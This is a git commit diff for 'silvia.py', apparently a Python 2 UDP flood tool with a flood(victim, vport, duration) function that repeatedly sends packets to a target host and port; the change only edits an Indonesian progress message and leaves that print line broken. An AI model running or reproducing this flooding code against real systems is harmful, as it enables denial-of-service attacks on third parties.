8eb7aef73148d50e11f88e26a2ddcc78a7088f18
XflowX234 <84327515+XflowX234@users.noreply.github.com>
2021-05-22 09:34:23 +0700

    Update silvia.py

--- silvia.py
+++ silvia.py
@@ -21,7 +21,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "Paket Sedang Diantar Ke Oleh Kurir "%(sent, victim, vport)
+        print "Paket Sedang Diantar Ke Oleh Kurir "(sent, victim, vport)
 
 def main():
     print len(sys.argv)
